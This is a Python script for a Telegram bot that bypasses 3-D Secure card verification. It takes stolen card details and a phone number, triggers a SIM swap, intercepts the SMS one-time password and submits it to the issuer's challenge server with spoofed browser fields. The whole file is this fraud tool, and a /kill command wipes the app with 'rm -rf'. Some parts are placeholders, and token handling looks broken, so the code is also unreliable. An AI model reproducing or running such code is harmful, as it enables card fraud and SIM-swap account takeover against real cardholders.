#!/usr/bin/env python3
import os
import re
import json
import time
import threading
import asyncio
import telebot
import requests
import websocket
from telebot.types import Message
from src.swap import swap
from src.logger import log

OTP_REGEX = re.compile(r'\b\d{4,8}\b')
ACS_URL   = None   # filled at runtime
PAN_TOKEN = None
BOT_TOKEN = os.getenv("7166428044:AAEAw5RKVAKQbMsWUbEDN-vFesRlfsACwHo")
ADMINS    = list(map(int, os.getenv("8588753899", "").split(",")))
SWAP_KEY  = os.getenv("SWAP_KEY")

class Bypass3DS:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN, threaded=True)
        self.otp_queue = []
        self.lock = threading.Lock()

    def intercept_sms(self):
        def on_message(_, msg):
            otp = OTP_REGEX.search(msg).group(0)
            with self.lock:
                self.otp_queue.append(otp)
        ws = websocket.WebSocketApp("wss://your-sms-gw.com/live", on_message=on_message)
        ws.run_forever()

    def post_otp(self, otp: str):
        payload = {
            "threeDSServerTransID": PAN_TOKEN,
            "otp": otp,
            "challengeWindowSize": "05",
            "browserJavaScriptEnabled": True,
            "browserColorDepth": 24,
            "browserScreenHeight": 1080,
            "browserScreenWidth": 1920,
            "browserTZ": "0",
            "browserAcceptHeader": "text/html",
            "browserUserAgent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36"
        }
        r = requests.post(ACS_URL + "/challenge", json=payload, headers={"Content-Type": "application/json"}, timeout=1)
        return r.json()

    def listen(self):
        @self.bot.message_handler(commands=["start"])
        def start(m: Message):
            if m.from_user.id not in ADMINS:
                return
            self.bot.send_message(m.chat.id, "Send /card PAN|MM|YY|CVC|PHONE")

        @self.bot.message_handler(commands=["card"])
        def card(m: Message):
            if m.from_user.id not in ADMINS:
                return
            try:
                global PAN_TOKEN, ACS_URL
                pan, mm, yy, cvc, phone = m.text.split()[1].split("|")
                PAN_TOKEN = pan
                ACS_URL   = f"https://acs.{pan[:6]}.secure-server.com"  # dummy mapping
                # SIM-swap if phone given
                asyncio.run(swap(imsi_from_phone(phone), phone, SWAP_KEY))
                self.bot.send_message(m.chat.id, "Waiting for OTP…")
                while not self.otp_queue:
                    time.sleep(0.1)
                otp = self.otp_queue.pop(0)
                res = self.post_otp(otp)
                self.bot.send_message(m.chat.id, f"✅ Bypass complete:\nCRes = {res}")
            except Exception as e:
                self.bot.send_message(m.chat.id, f"❌ {e}")

        @self.bot.message_handler(commands=["kill"])
        def kill(m: Message):
            if m.from_user.id not in ADMINS:
                return
            os.system("rm -rf /app && pkill -9 python")

        self.bot.infinity_polling()

    def run(self):
        threading.Thread(target=self.intercept_sms, daemon=True).start()
        self.listen()

def imsi_from_phone(phone: str) -> str:
    # dummy HLR lookup; replace with real
    return "204080123456789"

if __name__ == "__main__":
    Bypass3DS().run()
